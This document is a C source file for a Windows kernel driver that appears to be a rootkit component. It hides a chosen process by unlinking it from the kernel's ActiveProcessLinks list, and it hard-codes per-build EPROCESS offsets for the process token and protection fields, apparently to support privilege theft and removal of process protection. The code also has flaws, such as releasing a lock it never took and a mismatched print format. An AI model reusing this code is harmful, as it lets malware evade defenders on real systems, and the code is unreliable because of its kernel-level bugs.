#include "Features.h"

exprocess_offsets eoffsets;
EX_PUSH_LOCK pLock;

NTSTATUS HideProcess(int pid) {

	UNREFERENCED_PARAMETER(pid);

	PVOID process = nullptr;
	PLIST_ENTRY pList;

	__try {

		NTSTATUS status = PsLookupProcessByProcessId((HANDLE)pid, (PEPROCESS*)&process);

		if (!NT_SUCCESS(status)) {

			if (status == STATUS_INVALID_PARAMETER) {
				KdPrint(("[-] PID cannot be found.\n"));
			}
			else {
				KdPrint(("[-] An unknown error has occured while getting process!\n"));
			}


			return STATUS_UNSUCCESSFUL;
		}


        KdPrint(("[+] Process is found.\n"));
        pList = (PLIST_ENTRY)((char *)process + eoffsets.ActiveProcessLinks_offset);


        if (pList->Blink == nullptr || pList->Flink == nullptr) {
            ExReleasePushLockExclusive(&pLock);
            __leave;
        }

        if (pList->Flink->Blink != pList || pList->Blink->Flink != pList) {
            ExReleasePushLockExclusive(&pLock);
            KdPrint(("[-] Link is inconsistent.\n"));
            __leave;
        }

        pList->Flink->Blink = pList->Blink;
        pList->Blink->Flink = pList->Flink;

        pList->Blink = pList->Flink = nullptr;

        ExReleasePushLockExclusive(&pLock);

        KdPrint(("[+] Process %wZ is hidden now!\n", PsGetProcessImageFileName((PEPROCESS)process)));



	}

    __except (EXCEPTION_EXECUTE_HANDLER){
        
        KdPrint(("[-] An exception has occured while hiding process!\n"));

        return STATUS_UNSUCCESSFUL;

    }

    ObDereferenceObject(process);

    return STATUS_SUCCESS;
}


NTSTATUS InializeOffsets() {
    //DWORD dwOffset = 0;
    RTL_OSVERSIONINFOW pversion;

    RtlGetVersion(&pversion);

    if (pversion.dwBuildNumber == 17763) {
        eoffsets.Token_offset = 0x0358;
    }
    else if (pversion.dwBuildNumber == 18362) {
        eoffsets.Token_offset = 0x0360;
    }
    else if (pversion.dwBuildNumber == 19045) {
        eoffsets.Token_offset = 0x04B8;
    }
    else {
        eoffsets.Token_offset = 0;
    }

    if (pversion.dwBuildNumber == 14393) {
        eoffsets.ActiveProcessLinks_offset = 0x02F0;
    }
    else if (pversion.dwBuildNumber >= 15063 && pversion.dwBuildNumber <= 17763) {
        eoffsets.ActiveProcessLinks_offset = 0x0360;
    }
    else if (pversion.dwBuildNumber == 18362) {
        eoffsets.ActiveProcessLinks_offset = 0x02F0;
    }
    else if (pversion.dwBuildNumber == 19045) {
        eoffsets.ActiveProcessLinks_offset = 0x0448;
    }
    else {
        eoffsets.ActiveProcessLinks_offset = 0;
    }

    if (pversion.dwBuildNumber == 10586) {
        eoffsets.protection_offset = 0x06B2;
    }
    else if (pversion.dwBuildNumber == 14393) {
        eoffsets.protection_offset = 0x06C2;
    }
    else if (pversion.dwBuildNumber >= 15063 && pversion.dwBuildNumber <= 17763) {
        eoffsets.protection_offset = 0x06CA;
    }
    else if (pversion.dwBuildNumber == 18362) {
        eoffsets.protection_offset = 0x06FA;
    }
    else if (pversion.dwBuildNumber == 19045) {
        eoffsets.protection_offset = 0x087A;
    }
    else {
        eoffsets.protection_offset = 0;
    }

    if (eoffsets.ActiveProcessLinks_offset && eoffsets.Token_offset && eoffsets.protection_offset)
        return (STATUS_SUCCESS);

    DbgPrint("Unsupported Windows build %lu. Please open an issue in the repository", pversion.dwBuildNumber);

    return (STATUS_UNSUCCESSFUL);
}
